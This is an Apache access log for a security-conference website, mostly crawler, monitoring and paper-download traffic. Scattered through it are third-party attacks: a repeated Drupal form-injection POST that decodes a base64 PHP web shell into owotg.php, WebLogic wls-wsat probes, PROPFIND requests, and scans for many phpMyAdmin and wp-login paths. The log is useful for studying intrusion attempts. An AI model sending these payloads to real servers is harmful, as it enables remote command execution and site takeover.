www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:12:51 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 157.48.13.33 - - [02/May/2018:20:13:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.48.13.33 - - [02/May/2018:20:13:51 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 122.150.90.235 - - [02/May/2018:20:14:16 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 302 611 "https://scholar.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
www.nspw.org:80 137.112.228.195 - - [02/May/2018:20:14:34 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 ::1 - - [02/May/2018:20:15:09 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:15:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 35.226.164.28 - - [02/May/2018:20:15:40 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 ::1 - - [02/May/2018:20:16:11 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 185.130.184.223 - - [02/May/2018:20:16:31 -0400] "GET /manager/ HTTP/1.1" 302 485 "http://nspw.org/manager/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.130.184.223 - - [02/May/2018:20:16:32 -0400] "GET /manager/ HTTP/1.1" 302 485 "http://nspw.org/manager/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:20:16:39 -0400] "GET /papers/1993/?C=N;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:20:16:49 -0400] "GET /2009/proceedings/2008/?C=M;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.80.10.35 - - [02/May/2018:20:16:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.80.10.35 - - [02/May/2018:20:16:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:20:18:22 -0400] "GET /2009/proceedings/?C=D;O=A HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 35.226.164.28 - - [02/May/2018:20:18:29 -0400] "GET /current/ HTTP/1.1" 302 508 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:20:19:58 -0400] "GET /papers/2002/nspw2002-ashley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:20:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:25:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:27:22 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.38.149.58 - - [02/May/2018:20:27:59 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 207.46.13.54 - - [02/May/2018:20:29:05 -0400] "GET /papers/1999/nspw1999-olthoff-3.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:20:30:09 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:30:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:30:38 -0400] "GET /modules/user/user.css?nhfa6e HTTP/1.1" 302 585 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:30:38 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 302 584 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:20:30:39 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 302 603 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:20:30:39 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.1" 302 610 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:30:40 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 302 590 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:20:30:40 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 302 590 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:30:40 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 302 600 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:20:30:41 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 302 604 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:20:30:41 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 302 604 "http://www.nspw.org/2016/sponsors" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 178.255.215.92 - - [02/May/2018:20:30:57 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 178.255.215.92 - - [02/May/2018:20:30:58 -0400] "GET / HTTP/1.1" 302 488 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:32:49 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:32:49 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 216.244.66.247 - - [02/May/2018:20:33:29 -0400] "GET /2006/papers.shtml HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 103.80.142.154 - - [02/May/2018:20:34:23 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.80.142.154 - - [02/May/2018:20:34:25 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:35:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 144.138.6.243 - - [02/May/2018:20:35:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 144.138.6.243 - - [02/May/2018:20:35:58 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.124.158.138 - - [02/May/2018:20:36:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.124.158.138 - - [02/May/2018:20:36:04 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.93.214 - - [02/May/2018:20:37:30 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
www.nspw.org:80 36.110.211.108 - - [02/May/2018:20:39:11 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 39.51.125.96 - - [02/May/2018:20:39:25 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.51.125.96 - - [02/May/2018:20:39:35 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:40:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 190.73.145.180 - - [02/May/2018:20:41:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 190.73.145.180 - - [02/May/2018:20:41:32 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:42:44 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:42:46 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 93.32.69.4 - - [02/May/2018:20:42:59 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 93.32.69.4 - - [02/May/2018:20:43:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:45:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.156 - - [02/May/2018:20:45:24 -0400] "GET /2007/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 177.74.184.41 - - [02/May/2018:20:48:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 177.74.184.41 - - [02/May/2018:20:48:39 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:50:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.247 - - [02/May/2018:20:50:43 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.247 - - [02/May/2018:20:50:43 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:52:41 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:55:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 119.95.40.33 - - [02/May/2018:20:56:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 119.95.40.33 - - [02/May/2018:20:56:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 123.125.143.16 - - [02/May/2018:20:58:24 -0400] "GET / HTTP/1.1" 302 529 "http://www.baidu.com/s?wd=VAD" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [02/May/2018:20:58:30 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [02/May/2018:20:58:31 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [02/May/2018:20:58:32 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 207.46.13.54 - - [02/May/2018:20:59:28 -0400] "GET /papers/2005/nspw2005-schwarting.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 118.101.85.30 - - [02/May/2018:21:00:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 118.101.85.30 - - [02/May/2018:21:00:19 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:21:00:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:21:02:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:21:02:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 77.88.47.40 - - [02/May/2018:21:03:18 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 77.88.47.40 - - [02/May/2018:21:03:22 -0400] "GET /papers/2009/?C=N;O=D HTTP/1.1" 302 568 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:21:05:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:26 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:26 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:27 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:28 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:47 -0400] "GET /index.php HTTP/1.1" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:47 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 571 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:47 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:47 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:47 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:48 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:49 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:49 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:49 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:49 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:50 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:51 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:51 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:51 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:51 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:51 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:52 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:52 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:52 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:53 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:53 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:53 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:53 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:54 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:55 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:55 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:55 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:55 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
